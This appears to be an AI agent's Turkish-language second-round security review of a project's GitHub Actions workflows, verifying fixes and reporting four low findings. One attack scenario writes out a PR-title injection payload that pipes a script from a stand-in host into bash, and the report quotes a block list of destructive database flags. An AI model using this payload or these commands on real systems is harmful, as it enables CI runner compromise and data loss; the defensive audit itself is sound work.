# T-003 — `security` gate, tur 2

- **Tarih:** 2026-10-27
- **Sürüm:** ROADMAP v0.0.12
- **Dal:** `chore/ajan-altyapisi` (değişiklikler commit edilmemiş)
- **Yüzey:** tur 1 bulgularının düzeltmeleri — `.github/actions/*/action.yml`,
  `.github/workflows/{ci,release}.yml`, `.github/ci-forbidden-tokens.txt`,
  `scripts/{eslint.config.mjs,tsconfig.json,sync-platform-version.ts}`
- **Tur:** 2 (doğrulama turu)

```
GATE: security
SONUÇ: PASS
```

FAIL kuralı (AGENT_BASELINE §4): 0 critical, 0 high, 0 medium, **4 low** →
yalnızca `low` = **PASS**, bulgular teknik borca kaydedilir.

**Tur 1 bulguları:** 6 bulgu → **4 tam kapandı**, **2 kısmen kapandı** (artık `low`
seviyesinde kalan artıklar aşağıda B1/B2). Düzeltmelerin açtığı **1 yeni** `low` (B3),
**1 yeni** dayanıklılık `low`'u (B4).

---

## 1. Tur 1 bulgularının kapanış durumu — kendi ürettiğim kanıtla

Yöntem: `guards` job'unun iki kontrol adımının `run:` gövdesi `ci.yml`'den **birebir**
çıkarıldı (`sed -n '318,386p'` ve `sed -n '247,295p'` + 10 boşluk dedent) ve yerel
koşturuldu. Negatif (ihlal enjekte edilmiş) senaryolar **`.github`'ın sandbox kopyasında**
çalıştırıldı — gerçek repo dosyalarına **hiç dokunulmadı** (bkz. §4 temizlik kanıtı).
devops'un beyanı **kullanılmadı**.

### medium #1 — `run-gates/action.yml` içinde `${{ inputs.filter }}` → **KAPANDI**

| Doğrulama                                  | Sonuç                                                                                                                                                                                                    |
| ------------------------------------------ | -------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- |
| Dört adımda da `env: FILTER` + `"$FILTER"` | **EVET** — `action.yml:35-58`: Lint(38/39), Tip denetimi(44/45), Test(51/52), Derleme(57/58). Dördü de `--filter="$FILTER"`                                                                              |
| Tırnak kullanımı                           | **Doğru** — `$FILTER` dosyada yalnızca bu dört yerde geçiyor, dördü de **çift tırnaklı**. Tırnaksız geçiş yok                                                                                            |
| Çağrı yerleri hâlâ literal mi              | **EVET** — `ci.yml:580,604,622,640,665` beşi de literal (`'@arkesoft/api...'` … `'./packages/*'`); olay verisi yok                                                                                       |
| `guards` kontrolü eklendi mi               | **EVET** — `ci.yml:315-386`, hedef `find .github/workflows .github/actions -name '*.yml' -o -name '*.yaml'` → **5 dosya** (ci.yml, release.yml + 3 composite). Yani composite'ler **gerçekten** kapsamda |

**İki yönlü kanıt (benim koşumum):**

| Test | Senaryo                                                                 | Beklenen | Gerçek               |
| ---- | ----------------------------------------------------------------------- | -------- | -------------------- |
| —    | Temiz repo (gerçek dosyalar)                                            | exit 0   | **exit 0**           |
| T1   | Composite'in `run: \|` bloğuna `${{ github.event.pull_request.title }}` | exit 1   | **exit 1**           |
| T2   | Tek satır `run: echo "${{ … }}"` formu                                  | exit 1   | **exit 1**           |
| T3   | İfade yalnızca `if:` + `env:` içinde (yanlış pozitif testi)             | exit 0   | **exit 0**           |
| T4   | **Çok satırlı düz skaler** `run:` (blok göstergesi yok)                 | exit 1   | **exit 0** ← atlatma |

T4 artığı B3'te `low` olarak raporlandı. Tur 1'in asıl bulgusu (dört ihlal + mekanik
kontrolün hiç olmaması) **kapandı**.

### medium #2 — AC13 veri kaynağı koruması → **KISMEN KAPANDI**

**(a) Fail-closed mı?** `ci.yml:252-273` iki katmanlı: desen sayısı alt sınırı
(`min_expected_patterns=10`) + R-6 öz-testinin `exit 1`'i. Kendi koşumum:

| Test | Senaryo                                                | Beklenen | Gerçek                    |
| ---- | ------------------------------------------------------ | -------- | ------------------------- |
| A    | Liste **tamamen boşaltıldı**                           | exit 1   | **exit 1**                |
| B    | Tüm satırlar **yorum satırına çevrildi**               | exit 1   | **exit 1**                |
| C    | 15 → **11 desene** daraltıldı (4 yıkıcı jeton silindi) | ?        | **exit 0** ← yakalanmıyor |
| D    | 15 → **9 desene** daraltıldı                           | exit 1   | **exit 1**                |

Jeton listesi gerçek repoda **hiç bozulmadı** — A/B/C/D sandbox kopyasında koştu.

**Sonuç:** "toptan boşaltma" sınıfı **kapandı**. Ama eşik, **hedefli daraltmayı**
yakalamıyor: tur 1'in yazdığı asıl senaryo (bir katkıcının `pnpm audit` satırını silmesi,
15 → **14** desen) bugün de **yeşil geçiyor**. → B2'de `low`.

**(b) Dört yıkıcı jeton:** **EVET**, dördü de listede
(`ci-forbidden-tokens.txt:62-65`: `PRISMA_USER_CONSENT_FOR_DANGEROUS_AI_ACTION`,
`migrate reset`, `db push --force-reset`, `--accept-data-loss`). **Etkin olduğu
kanıtlandı:** `release.yml`'e `--accept-data-loss` içeren bir satır eklendiğinde
**exit 1** (test F). Ayrıca temiz repo koşumu exit 0 → bu dört jeton `.github/**` altında
**gerçekten yok**.

**(c) R-6 korunuyor mu?** **EVET, iki yönlü:**

- Öz-test (1/2): `.txt` dosyası hedefe **dahil edilirse** 15 desenin tamamı eşleşiyor
  (benim koşumumda 26 satır eşleşme basıldı) → liste canlı.
- Gerçek tarama (2/2): `find`'ın ürettiği hedef kümesi **tam 5 dosya**, hiçbiri `.txt`
  değil (`grep -c 'forbidden-tokens'` → **0**). Yani liste kendi kendini eşlemiyor.
- Bonus: `pull_request_target` jetonu `release.yml`'e enjekte edildiğinde **exit 1**
  (test E) → tarama hedefi gerçekten canlı, R-6 muafiyeti taramayı kör etmiyor.

**(d) CODEOWNERS:** **bilinçli olarak eklenmedi** (kullanıcı kararı — GitHub kimliği
gerektiriyor). Talimata uygun olarak `medium` tekrar yazılmadı; §3'te **borç notu**.

**Ek not kalemi (tur 1):** `grep`'in "eşleşme yok" (exit 1) ile "hata" (exit >1) ayrımı
**yapıldı** — `ci.yml:283-294` `set +e` / `grep_exit` / `elif [ "$grep_exit" -gt 1 ]`.
**Kapandı.**

### low'lar — dördü de **KAPANDI**

| Tur 1 low                                     | Kanıt                                                                                                                                                                                                                          | Durum                                       |
| --------------------------------------------- | ------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------ | ------------------------------------------- |
| `tag` job'unda `contents: write`              | `release.yml`'de `grep -nE 'permissions\|contents:\|pull-requests:'` → yalnızca satır 18-19 (kök `contents: read`) ve 30-32 (`version-pr`). `tag` job'unda `permissions:` **yok** → kök `contents: read` miras alıyor          | **KAPANDI**                                 |
| `setup-workspace` gevşek `restore-keys`       | `grep -rn "restore-keys" .github/` → tek eşleşme satır 55'teki **yorum** ("BİLEREK YOK"). `actions/cache` yalnızca tam `key: turbo-${{ runner.os }}-${{ hashFiles('pnpm-lock.yaml') }}`                                        | **KAPANDI**                                 |
| `timeout-minutes` + `concurrency` yok         | `ci.yml`: **9/9** job'da `timeout-minutes` (plan 20, repo 20, guards 20, api **30**, admin/superadmin/storefront/shared 20, ci-gate 20) + `concurrency: {group: ci-${{ github.ref }}, cancel-in-progress: true}` (satır 23-25) | **KAPANDI** (ci.yml için; release.yml → B4) |
| `release.yml` `--ignore-scripts` ile kurmuyor | `release.yml:52` `ignore-scripts: 'true'` → `setup-workspace/action.yml:69-72` `IGNORE_SCRIPTS_FLAG` **`env:` üzerinden** → `pnpm install --frozen-lockfile $IGNORE_SCRIPTS_FLAG`                                              | **KAPANDI**                                 |

---

## 2. BULGULAR

### [SEV: low] `.github/workflows/ci.yml:343-376` — ifade yasağı kontrolü çok satırlı düz skaler `run:` formunu atlıyor

awk tabanlı kontrol `in_run` durumuna yalnızca `run: |` veya `run: >` (blok göstergeli)
satırlarda giriyor (`ci.yml:362`). YAML'ın **blok göstergesiz çok satırlı düz skaler**
formunda ise ilk satır `^run:` dalına düşüyor (satır 367) ve **devam satırları hiç
taranmıyor**.

Kendi kanıtım (test T4) — sandbox'ta şu adım eklendiğinde kontrol **exit 0** veriyor:

```yaml
- name: Atlatma
  shell: bash
  run: echo hello
    "${{ github.event.pull_request.title }}"
```

YAML semantiği doğrulandı (`yaml@2.9.1` ile ayrıştırıldı):
`run = "echo hello \"${{ github.event.pull_request.title }}\""` — yani GitHub bunu tek
satırlık bir script'e katlıyor ve ifadeyi **metinsel olarak** yerine koyuyor; enjeksiyon
tam olarak tur 1'de tarif edilen şekilde gerçekleşir.

**Saldırı senaryosu:** Bir katkıcı uzun bir `turbo`/`pnpm` komutunu iki satıra sarar ve
içine `${{ github.event.pull_request.title }}` (veya `head_ref`) koyar. Fork'tan PR açan
saldırgan PR başlığına `x"; curl -s https://evil/sh | bash; echo "` yazar; `pull_request`
tetikleyicisi fork kodunu checkout etmiyor olsa da **başlık** olay verisidir ve runner'da
komut olarak koşar. `guards` kontrolü yeşil kalır; `actionlint` ifade enjeksiyonu
denetlemiyor (yalnızca şema + shellcheck, üstelik composite `action.yml`'leri hiç
görmüyor — `ci.yml:522-529`). Yani bu formda **hiçbir mekanik engel kalmıyor**.

**Neden `medium` değil:** bugün ihlal **yok** (temiz koşum exit 0, 5 dosyanın hepsi
denetlendi) ve istismar iki bağımsız hata gerektiriyor — hem olay verisinin `run:`a
sokulması hem de alışılmadık YAML formu (repo bugün her yerde `|` kullanıyor).
Korunan son hat (`main` korumalı, PR insan incelemesinden geçiyor) duruyor.

**Önerilen düzeltme:** `run:` gövdesini elle ayrıştırmayı bırak — `yq`/Node `yaml` ile
her `steps[].run` skalerini çöz ve ifade kalıbını **çözülmüş değerde** ara (hem blok hem
düz skaler, hem de `>`-katlanmış formu tek seferde kapanır). Minimum çözüm: `^run:`
dalına girildiğinde de girinti takibini aç (devam satırlarını `in_run` gibi ele al).

**Sorumlu ajan:** `devops`

---

### [SEV: low] `.github/workflows/ci.yml:256-261` + `.github/ci-forbidden-tokens.txt` — eşik hedefli daraltmayı yakalamıyor

`min_expected_patterns=10`, liste ise **15** desen içeriyor. Aradaki **5 desenlik boşluk**
serbest: istediğiniz 5 jetonu silip CI'yı yeşil bırakabilirsiniz. Kendi kanıtım (test C):
4 yıkıcı Prisma jetonu + `pnpm audit` silinip 11 desene inildiğinde kontrol **exit 0**.

**Saldırı senaryosu (tur 1 senaryosunun aynısı, hâlâ açık):** Bir katkıcı veya AI ajanı
v0.0.16'ya ertelenmiş `pnpm audit`'i CI'ya eklemek ister, `guards` kırmızı verir; onay
istemek yerine `.txt`'den **o bir satırı** siler (15 → 14 desen, eşiğin **çok** üstünde)
ve kontrolü aynı PR'da yeşile döndürür. Daha ağır varyant: `TURBO_TOKEN` + `TURBO_TEAM`
satırları silinip uzaktan önbellek kimlik bilgileri iş akışına sokulur; kullanıcı
kararıyla (K0b) kapsam dışı bırakılmış bir yetenek **sessizce** geri gelir. Aynı hamle
`--accept-data-loss` için yapıldığında yıkıcı Prisma bayrağının önündeki tek mekanik
engel kalkar.

**Neden `low` (tur 1'de `medium`'du):** üç alt sorunun **ikisi gerçekten kapandı** —
fail-open davranış (A/B/D testleri artık exit 1) ve dört yıkıcı jetonun eksikliği (F
testi). Kalan artık yalnızca **hedefli** silme; bu, ilgili satırın diff'te görünür olması
ve `main`'in korumalı olması nedeniyle insan incelemesine açık. CODEOWNERS bu artığı
kapatacaktı ama bilinçli olarak ertelendi (bkz. §3).

**Önerilen düzeltme (CODEOWNERS'a gerek yok, ucuz):** eşiği sayı yerine **zorunlu jeton
listesiyle** değiştir — adımın kendi içinde `required=(TURBO_TOKEN TURBO_TEAM
"--accept-data-loss" "migrate reset" "db push --force-reset"
PRISMA_USER_CONSENT_FOR_DANGEROUS_AI_ACTION)` tutulup her birinin `$pattern_file`'da
**var olduğu** doğrulanırsa silme mekanik olarak engellenir. Alternatif/ek: `-lt 10`
yerine `-ne <beklenen tam sayı>` (liste büyüdüğünde adımın da güncellenmesini zorlar).

**Sorumlu ajan:** `devops`

---

### [SEV: low] `.github/ci-forbidden-tokens.txt` + `ci.yml:281-295` — sabit-metin tarama yanlış pozitif baskısı üretiyor

Tarama `grep -nFf` (sabit metin, **kelime sınırı yok**, yorum satırları **hariç
tutulmuyor**) ve hedef `.github/**/*.yml`'in **tamamı** — kod değil, yorumlar da dahil.
15 jetonun bir kısmı (`container:`, `node-version:`, `test:isolation`, `pnpm audit`,
`playwright`, `docker build`) iş akışı **yorumlarında** doğal olarak geçmek isteyen
ifadeler.

**Somut baskı — bu değişikliğin kendisinde zaten gerçekleşti:** `ci.yml:301-308` ve
`:330-334`'teki yorumlar, jetonları bitişik yazmamak için **özellikle dolambaçlı**
kurulmuş ("bu adımın kendi metni o üç jetonun tam yazımını bitişik içermiyor");
`ci.yml:335-337` ise aranan kalıbı çalışma anında iki parçadan birleştiriyor
(`needle_a`/`needle_b`). Yani kontrol, kendi dosyasını yazan ajanı bir kaçınma hilesine
**zorladı** (T3-5 dersi). Sonraki katkıcı bir yorumda `container:` ya da `pnpm audit`
yazdığında CI kırmızı olacak ve nedeni kodda değil yorumunda olacak; bu durumda en kolay
çıkış yolu jetonu `.txt`'den **silmek** (ki B2 gereği bugün 5 silme serbest). Yani iki
`low` birbirini besliyor.

**Neden `low`:** bugün ihlal yok, kontrol yanlış tarafa (kırmızıya) başarısız oluyor —
sessiz bir güvenlik kaybı değil, bir kullanılabilirlik/erozyon riski.

**Önerilen düzeltme:** taramadan önce hedef dosyaların yorum satırlarını düş
(`grep -v '^[[:space:]]*#'`) veya jetonları yorumsuz `yq` çıktısında ara; alternatif
olarak kelime/bağlam sınırı gerektiren jetonlar için `grep -E` kalıbına geç
(ör. `^\s*container:` — YAML anahtarı olarak geçtiği yer).

**Sorumlu ajan:** `devops`

---

### [SEV: low] `.github/workflows/release.yml` — deponun tek yazma yetkili iş akışında `timeout-minutes` ve `concurrency` yok

`ci.yml`'e eklenen iki koruma `release.yml`'e **taşınmadı**: `grep -nE
"timeout-minutes|concurrency"` → **sıfır eşleşme**. `version-pr` job'u
`contents: write` + `pull-requests: write` + `GITHUB_TOKEN` taşıyor.

**Senaryo:** (1) Bir adım asılırsa (`changesets/action`'ın git push'u, ağ) job GitHub'ın
**360 dakikalık** varsayılanına kadar koşar ve **yazma yetkili bir token** o süre boyunca
canlı kalır — gereksiz geniş bir pencere. (2) `main`'e kısa aralıkla iki push geldiğinde
`concurrency` olmadığı için **iki `version-pr` job'u eşzamanlı** koşar; ikisi de
`pnpm release:version` ile kök `package.json` + `CHANGELOG.md`'yi yazıp aynı sürüm dalına
push eder → yarış, bozuk/çift sürüm yükseltmesi (veri bütünlüğü).

**Önerilen düzeltme:** `version-pr`'a `timeout-minutes: 15`; iş akışı seviyesinde
`concurrency: { group: release-${{ github.ref }}, cancel-in-progress: false }`.
**`cancel-in-progress` burada `false` olmalı** — yarı yazılmış bir sürüm commit'ini
ortada kesmek `ci.yml`'deki durumun tersine **zararlıdır**.

**Sorumlu ajan:** `devops`

---

## 3. Değerlendirildi — bulgu değil (kategorik bulgu yazılmadı)

**`scripts/eslint.config.mjs` + `scripts/tsconfig.json` yol bağımlılığı — yeni yüzey
DEĞİL.** `./packages/config/node_modules/.bin/eslint`'in doğrudan çalıştırılması ve
`typeRoots: ["../packages/config/node_modules/@types"]`, **ayrıcalık farkı üretmiyor**:
(a) aynı ağaç her hatta `pnpm exec eslint`/`tsc` ile zaten çalıştırılıyor — `.bin`
yolunu elle yazmak güven sınırını değiştirmiyor, yalnızca pnpm'in çözümleyicisini
atlıyor, **içerik aynı**; (b) bu komut `guards` job'unda koşuyor, o job
`contents: read` ve **hiç `secrets.*` okumuyor**; (c) yol yanlışsa komut
**gürültülü** başarısız olur (sessiz atlama yok); (d) `--ignore-scripts` verilmediği
için zaten `pnpm install` o ağacı kuruyor. Yeni bağımlılık eklenmemiş (lockfile bu turda
değişmedi). **Bulgu değil.**

**`release.yml`'in `setup-workspace` kullanımı — doğru kurulmuş.**
`create-env: 'false'` + `ignore-scripts: 'true'` (satır 51-52) → `.env` üretilmiyor ve
yazma yetkili job'da postinstall yüzeyi **kapalı** (tur 1 C4 bu şekilde kapandı).
`IGNORE_SCRIPTS_FLAG` `env:` üzerinden geçiyor; `run:` içinde **tırnaksız** genişliyor
(`$IGNORE_SCRIPTS_FLAG`) ama bu **bilinçli kelime bölmesi** ve değer kümesi GitHub
ternary'si tarafından iki literale (`--ignore-scripts` / boş) kilitli — girdi ne olursa
olsun üçüncü bir değer üretilemez. Enjeksiyon yok.

**`.turbo` önbelleğinin yazma yetkili job'da geri yüklenmesi — ek risk DEĞİL.** İki
bağımsız gerekçe: (1) `release:version` komutu
(`package.json:37` = `sync-platform-version.ts --collect && changeset version &&
… --apply`) **turbo'yu hiç çağırmıyor** → geri yüklenen önbelleğin **tüketicisi yok**,
dosyalar kullanılmadan kalıyor; (2) `release.yml` yalnızca `main`'e push ile tetikleniyor
ve GitHub'ın önbellek kapsamı kuralı gereği **varsayılan dal koşumları PR/özellik
dalı önbelleklerini okuyamaz** → tur 1'deki önbellek zehirleme senaryosunun (C2) bu
job'a uzanan bir yolu yok. Hijyen notu (bulgu değil): bu composite girdisine ileride bir
`restore-cache: 'false'` eklenebilir.

**`concurrency: cancel-in-progress: true` → `ci-gate` `cancelled` — doğru yön.**
`ci-gate` varsayılan-reddet (`ci.yml:712-715`, `success|skipped` dışındaki **her** değer
`ok=false`). Koşum iptal edilirse `ci-gate` da `cancelled` olur ve GitHub'a **başarısız
olmayan** bir sonuç raporlanmaz → zorunlu check geçmez, PR birleşmez. Yerini alan yeni
koşum geçerli sonucu üretir. `cancel-in-progress` bir güvenlik kontrolünü **gevşetmiyor**;
tersine sahte yeşil üretmesi yapısal olarak imkânsız. **Bulgu değil.**

**`/tmp/needs.json` (`ci.yml:691,710,716`) — manipülasyon yolu yok.** GitHub barındırmalı
runner'da her job **temiz bir VM**; `/tmp` job'lar veya koşumlar arasında paylaşılmıyor.
Self-hosted bir runner'a geçilse bile: yazma `>` ile **koşulsuz üzerine yazıyor** (önceden
yerleştirilmiş içerik hayatta kalmaz) ve yazma başarısız olursa `set -euo pipefail`
**fail-closed** keser. Denetlenecek job listesi `jq -r 'keys[]'` ile `toJSON(needs)`'ten
türetiliyor → elle tutulan ikinci liste yok. Hijyen notu: `$RUNNER_TEMP` daha idiyomatik
olurdu. **Bulgu değil.**

**`scripts/sync-platform-version.ts` (bu turda değişti, mtime 11:01) — yeniden denetlendi,
temiz.** Zod kapsamı korunuyor (`JSON.parse` → `unknown` → `*.parse()`, satır 89-92).
Fail-closed sıra **bozulmamış**: `insertChangelogEntry` sentinel yoksa **yazmadan önce**
`throw` (232-240), `runApply` sırası entry üret (302) → içerik üret (303) → ancak sonra
`updateRootVersion` (305) → `writeFileSync` (306) → `rmSync` (307). Tek `as`
(satır **289**) Zod `parse`'ından **bir satır sonra** (288) — CLAUDE.md §4 kuralına uygun.
`child_process`/`exec`/`eval` yok; `process.argv` yalnızca üç modlu discriminated union'a
(`parseArgs` + `assertNever`) besleniyor, dosya yoluna **geçmiyor** → path traversal yok.
Prototype pollution: `JSON.parse` `__proto__`'yu **own property** olarak kurar, prototipe
yazmaz; mutasyon yalnızca `version` alanına. **Bulgu değil.**

**`ci-expected-test-packages.txt` — aynı sınıf risk yok.** Tasarımı gereği fail-closed:
dosya boşaltılırsa `expected=""` ama `actual` dolu kalır → eşitsizlik → `exit 1`
(`ci.yml:443-450`). Ayrı bir koruma gerekmiyor.

**`prepare-db`'den `pnpm env:init`'in kaldırılması — R-9 etkilenmedi.** `api` job'u
`setup-workspace`'i `with:` **vermeden** çağırıyor (`ci.yml:572`) → `create-env`
varsayılanı `'true'` → `.env` üretiliyor; `guards` (`:240-242`) ve `release.yml`
(`:51`) açıkça `'false'` veriyor. `.env` sahipliği tek yerde, AC12a probu hâlâ
`.env` olmadan koşuyor.

### Borç notu (yeni bulgu değil)

`CODEOWNERS` yok — bilinçli, kullanıcı kararı (GitHub kimliği/takım gerektiriyor).
`.github/**` ve `scripts/**` için gözden geçirici zorunluluğu olmadığı sürece B2'nin
artığı (hedefli jeton silme) ve genel olarak güvenlik kontrolü dosyalarının korumasızlığı
**teknik borç** olarak kalıyor. Tur 1'de `medium`'un parçasıydı; talimat gereği
`medium` olarak tekrarlanmadı.

---

## 4. Değişmeyen gerçekler — yeniden denetlenmedi (talimat gereği)

- `apps/api/src/**`, `packages/{db,errors}/src/**`: bu Task'ta değişmedi.
- `pnpm audit`: **yeniden koşturulmadı.** Tur 1 sonucu geçerli — critical 0 · **high 1**
  (`multer`, GHSA-q7qp-rjg7-q26m, `@nestjs/platform-express` üzerinden geçişli) ·
  moderate 0 · low 0. Bu değişiklikten kaynaklanmıyor; `ROADMAP.md:1238` + `:1317`'de
  v0.0.16 vadesiyle kayıtlı. `pnpm-lock.yaml` **bu turda değişmedi** (mtime/durum:
  tur 1'den beri aynı `M` kaydı, yeni paket yok).
- `changesets/action@a45c4d594aa4e2c509dc14a9f2b3b67ba3780d0d` (40 karakter SHA) —
  değişmedi (`release.yml:56`).
- `pull_request_target` — yoktu, yok (temiz AC13 koşumu exit 0 ile **mekanik olarak**
  doğrulandı).
- `actionlint` tedarik zinciri (resmî release + sabit `expected_sha256` + `sha256sum -c -`,
  `ci.yml:504-516`) — değişmedi.

### Temizlik kanıtı — jeton listesi ve iş akışı dosyaları bozulmadı

Tüm negatif testler `.github`'ın **sandbox kopyasında** koştu; gerçek dosyalara hiç
yazılmadı. Doğrulama:

```
$ git status --short          # .github/ hâlâ tek bir "??" kaydı (izlenmiyor), M kaydı yok
?? .github/
$ cd sandbox && diff /tmp/tok.bak .github/ci-forbidden-tokens.txt
(fark yok)
```

Gerçek `.github/ci-forbidden-tokens.txt` **hiç açılmadı/yazılmadı**: 15 desen,
`wc -l` → 65 satır, temiz AC13 koşumu (gerçek repoda, §1(c)) 15 desenin tamamını
eşleştirdi.

---

## 5. Tenant izolasyonu (CLAUDE.md §7, 14 madde)

Tur 1'deki durum değişmedi: bu Task **hiçbir tenant'a bağlı yüzeye dokunmuyor** — yeni
tablo, migration, tRPC prosedürü, kuyruk işi, önbellek anahtarı, S3 öneki, arama indeksi
veya kullanıcıya dönük hata mesajı yok. Düzeltme turu da yalnızca CI yapılandırmasına ve
`scripts/`e dokundu. **14 maddenin tamamı N/A; karşılanmayan madde yok.**

Tek dolaylı temas (tur 1'de de aynı): `prepare-db` CI'da `pnpm db:deploy` + `pnpm db:seed`
koşuyor; hedef job ile birlikte yok olan geçici servis konteyneri, `db:seed` sarmalayıcının
host allowlist'inden (`localhost`/`127.0.0.1`/`::1`) geçiyor. Bu turda `prepare-db`'den
yalnızca `pnpm env:init` kaldırıldı — veritabanı yüzeyi değişmedi.

---

## ÖLÇÜMLER

- **Denenen saldırı/doğrulama vektörü: 24**
  - İfade yasağı kontrolü: 4 (temiz · `run: |` enjeksiyonu · tek satır `run:` ·
    `if:`/`env:` yanlış pozitif) + 1 atlatma (çok satırlı düz skaler) + 1 YAML katlama
    semantiği doğrulaması (`yaml@2.9.1`)
  - AC13 veri kaynağı: 6 (temiz · boş liste · tüm satırlar yorum · 11 desen · 9 desen ·
    hedefli jeton enjeksiyonu ×2: `pull_request_target`, `--accept-data-loss`)
  - R-6 iki yönlü: 2 (`.txt` dahil → eşleşme var · `find` hedefinde `.txt` yok → 0)
  - Kapanış denetimi: 4 (`$FILTER` tırnak envanteri · `tag` izinleri ·
    `restore-keys` artığı · 9/9 `timeout-minutes` + `concurrency`)
  - Yeni yüzey: 6 (`.bin` yolu/`typeRoots` ayrıcalık farkı · `.turbo` + yazma yetkili job
    - GitHub önbellek kapsamı · `cancel-in-progress` → `ci-gate` varsayılan-reddet ·
      `/tmp/needs.json` · `IGNORE_SCRIPTS_FLAG` tırnaksız genişleme ·
      `sync-platform-version.ts` yeniden denetimi)
- **İncelenen dosya: 12** — 9 birincil (`ci.yml`, `release.yml`, `run-gates/action.yml`,
  `setup-workspace/action.yml`, `prepare-db/action.yml`, `ci-forbidden-tokens.txt`,
  `ci-expected-test-packages.txt`, `scripts/eslint.config.mjs`, `scripts/tsconfig.json`)
  - 3 referans (`scripts/sync-platform-version.ts`, kök `package.json`,
    tur 1 raporu)
- **Tur 1 bulgularının kapanışı: 6/6 ele alındı** — **4 tam kapandı**
  (4 low: `tag` izni, `restore-keys`, timeout+concurrency, `--ignore-scripts`),
  **2 kısmen kapandı** (2 medium → artıkları `low`'a indi: B1'in mekanik kontrolü
  eklendi ama bir YAML formunu atlıyor; B2'nin fail-open'ı ve eksik yıkıcı jetonları
  kapandı ama hedefli daraltma açık)
- **Bulgu dağılımı (tur 2):** critical **0** · high **0** · medium **0** · low **4**
  (2 artık + 2 yeni)
- **Karşılanmayan tenant izolasyon maddesi:** yok (14/14 N/A)
- **Çalıştırılmadı:** `pnpm audit` (talimat gereği — tur 1 sonucu geçerli, lockfile
  değişmedi), `gh` komutları (push/PR/workflow run), gerçek runner üzerinde iş akışı
  koşumu, yıkıcı veritabanı komutu.
